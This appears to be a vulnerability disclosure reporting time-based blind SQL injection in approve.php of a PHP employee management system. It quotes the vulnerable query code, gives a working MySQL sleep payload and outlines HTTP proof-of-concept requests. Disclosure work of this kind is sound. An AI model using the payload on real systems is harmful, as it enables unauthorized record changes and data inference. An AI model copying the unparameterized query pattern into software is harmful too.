## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/approve.php` contains a SQL Injection (time-based blind) vulnerability

Impact of the vulnerability
The application directly concatenates user-supplied parameters into an SQL `UPDATE` statement without parameterization. An attacker may be able to:

- Manipulate the approval logic (unauthorized status changes, depending on DB behavior/permissions)
- Infer database behavior/data using blind techniques
- Cause performance degradation by triggering time-delay or expensive database operations

### Payload:

(select*from(select+sleep(5)union/**/select+1)a)

```
(select*from(select+sleep(5)union/**/select+1)a)
```

### POC:

The vulnerable endpoint is `GET /approve.php?id=...&token=...`. The `id` and `token` parameters are used directly in SQL:

$id = $_GET['id'];

$token = $_GET['token'];

$result = mysqli_query($conn, "UPDATE `employee_leave` SET `status`='Approved' WHERE id = $id AND token = $token;");

header("Location:empleave.php");

- Baseline request (normal response time; results in a redirect):

GET /approve.php?id=1&token=301 HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

- Time-delay verification request (use a URL-encoded time-delay expression in an authorized test environment; results in a redirect after the database operation):

GET /approve.php?id=<URL_ENCODED_TIME_DELAY_PAYLOAD>&token=301 HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

Expected result:
Compared to the baseline, the verification request responds noticeably slower by approximately `<DELAY_SECONDS>`, then returns `302 Found` with `Location: empleave.php`, indicating the injected expression was executed during the SQL `UPDATE`.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409150354537](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409150354537.png)